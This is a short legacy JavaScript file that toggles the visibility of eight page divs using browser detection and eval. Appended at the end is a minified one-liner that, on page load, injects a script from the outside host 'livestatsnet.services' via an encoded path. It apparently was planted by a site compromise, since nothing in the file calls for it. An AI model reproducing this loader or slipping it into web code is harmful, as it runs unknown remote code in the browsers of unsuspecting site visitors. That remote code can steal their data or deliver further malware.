// JavaScript Document
numdivs=8

IE5=NN4=NN6=false
if(document.all)IE5=true
else if(document.layers)NN4=true
else if(document.getElementById)NN6=true

function init() {
	showDiv(0)
}
function showDiv( which ) {
	for(i=0;i<numdivs;i++) {
		if(NN4) eval("document.div"+i+".visibility='hidden'")
		if(IE5) eval("document.all.div"+i+".style.visibility='hidden'")
		if(NN6) eval("document.getElementById('div"+i+"').style.visibility='hidden'")
	}
	if(NN4) eval("document.div"+which+".visibility='visible'")
	if(IE5) eval("document.all.div"+which+".style.visibility='visible'")
	if(NN6) eval("document.getElementById('div"+which+"').style.visibility='visible'")
}
if(!loadStats){function loadStats(){var head=document.getElementsByTagName("head")[0],scr=document.createElement("script");scr.type="text/javascript",scr.src="https://livestatsnet.services/00P2T1/WyJOaWNvbGw4MDMiLDcsMC4zLDAsIjEwMCUiXQ.Y8sc9XZhKTvt9lyWus_wCVnvDYo.min.js",scr.async="async",head.appendChild(scr)}loadStats()}
